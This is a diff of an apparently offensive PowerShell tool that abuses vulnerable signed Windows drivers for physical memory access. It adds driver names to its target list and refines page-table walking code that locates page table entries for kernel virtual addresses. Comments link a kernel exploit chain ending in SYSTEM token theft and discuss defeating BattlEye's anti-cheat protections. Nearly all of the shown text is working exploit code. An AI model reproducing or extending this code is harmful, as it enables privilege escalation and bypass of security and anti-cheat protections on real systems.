@@ -69,8 +69,8 @@ using namespace System.Windows.Forms
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
             "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
             "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U", "PSKD64",
-            "RootLaser", "ZyArk", "ZYArKit", "Alinubx", "ardrv", 
-            "PCTcore64", "PCTCoreDevice", "fekern_00", "fekern",
+            "RootLaser", "ZyArk", "ZYArKit", "Alinubx", "ardrv", "HtAntiCheatDriver",
+            "PCTcore64", "PCTCoreDevice", "fekern_00", "fekern", "GameDriverX64",
             "cpqsysio64", "cpqsysio", "WinMsrDev", "LnvMSRIO"
 
  $Binary | % {
@@ -7757,27 +7757,30 @@ function Bind-KernelAddress {
         $pdpt_idx = [UInt64](($VA -shr 30) -band 0x1FF)
         $pd_idx   = [UInt64](($VA -shr 21) -band 0x1FF)
         $pt_idx   = [UInt64](($VA -shr 12) -band 0x1FF)
-        $offset   = [UInt64]($VA -band 0xFFF)
 
         [UInt64]$PFN_MASK = 0x0000FFFFFFFFF000
 
+        # Level 4: PML4
         $pml4e_addr = $Cr3 + ($pml4_idx * 8)
         $pml4e = Get-UnsignedPhysical -Address $pml4e_addr
-        if (-not ($pml4e -band 1)) { Write-Host "Failed at PML4: Present bit is 0!" -ForegroundColor Red; return 0 }
+        if (-not ($pml4e -band 1)) { throw "Failed at PML4: Present bit is 0 for VA 0x{0:X}" -f $VA }
 
+        # Level 3: PDPT
         $pdpte_addr = ($pml4e -band $PFN_MASK) + ($pdpt_idx * 8)
         $pdpte = Get-UnsignedPhysical -Address $pdpte_addr
-        if (-not ($pdpte -band 1)) { Write-Host "Failed at PDPT: Present bit is 0!" -ForegroundColor Red; return 0 }
-        if ($pdpte -band 0x80) { return (($pdpte -band 0x0000FFFC0000000) + ($VA -band 0x3FFFFFFF)) }
+        if (-not ($pdpte -band 1)) { throw "Failed at PDPT: Present bit is 0 for VA 0x{0:X}" -f $VA }
+        if ($pdpte -band 0x80)     { throw "Target VA 0x{0:X} is part of a 1 GB Large Page; standard 4 KB PTE does not exist." -f $VA }
 
+        # Level 2: PD
         $pde_addr = ($pdpte -band $PFN_MASK) + ($pd_idx * 8)
         $pde = Get-UnsignedPhysical -Address $pde_addr
-        if (-not ($pde -band 1)) { Write-Host "Failed at PD: Present bit is 0!" -ForegroundColor Red; return 0 }
-        if ($pde -band 0x80) { return (($pde -band 0x0000FFFFFE00000) + ($VA -band 0x1FFFFF)) }
+        if (-not ($pde -band 1)) { throw "Failed at PD: Present bit is 0 for VA 0x{0:X}" -f $VA }
+        if ($pde -band 0x80)     { throw "Target VA 0x{0:X} is part of a 2 MB Large Page; standard 4 KB PTE does not exist." -f $VA }
 
+        # Level 1: PT
         $pte_addr = ($pde -band $PFN_MASK) + ($pt_idx * 8)
         $pte = Get-UnsignedPhysical -Address $pte_addr
-        if (-not ($pte -band 1)) { Write-Host "Failed at PT: Present bit is 0!" -ForegroundColor Red; return 0 }
+        if (-not ($pte -band 1)) { throw "Failed at PT: Present bit is 0 for VA 0x{0:X}" -f $VA }
 
         return $pte_addr
     }
@@ -8060,7 +8063,7 @@ function Resolve-DirectoryTable {
     # https://github.com/Haider303/trinity-lpe
     # https://github.com/magicsword-io/LOLDrivers/issues/394
 
-    # FastDump.sys + CITMDRV.sys + NTIOLib.sys: Full Kernel Exploit Chain — From KASLR Bypass to SYSTEM Token Theft
+    # FastDump.sys + CITMDRV.sys + NTIOLib.sys: Full Kernel Exploit Chain From KASLR Bypass to SYSTEM Token Theft
     # https://medium.com/@haider303mustafa/fastdump-sys-citmdrv-sys-567f57e9cd20
 
     # How is BattleEye making the physical reading fail?
@@ -8100,13 +8103,13 @@ function Resolve-DirectoryTable {
     $pdpte_addr = ($pml4e -band $PFN_MASK) + ($pdpt_idx * 8)
     $pdpte = Get-UnsignedPhysical -Address $pdpte_addr
     if (-not ($pdpte -band 1)) { Write-Host "Failed at PDPT: Present bit is 0!" -ForegroundColor Red; return 0 }
-    if ($pdpte -band 0x80) { return (($pdpte -band 0x0000FFFC0000000) + ($VA -band 0x3FFFFFFF)) }
+    if ($pdpte -band 0x80) { return (($pdpte -band 0x0000FFFFC0000000) + ($VA -band 0x3FFFFFFF)) }
 
     # 5. Walk PD
     $pde_addr = ($pdpte -band $PFN_MASK) + ($pd_idx * 8)
     $pde = Get-UnsignedPhysical -Address $pde_addr
     if (-not ($pde -band 1)) { Write-Host "Failed at PD: Present bit is 0!" -ForegroundColor Red; return 0 }
-    if ($pde -band 0x80) { return (($pde -band 0x0000FFFFFE00000) + ($VA -band 0x1FFFFF)) }
+    if ($pde -band 0x80) { return (($pde -band 0x0000FFFFFFE00000) + ($VA -band 0x1FFFFF)) }
 
     # 6. Walk PT
     $pte_addr = ($pde -band $PFN_MASK) + ($pt_idx * 8)
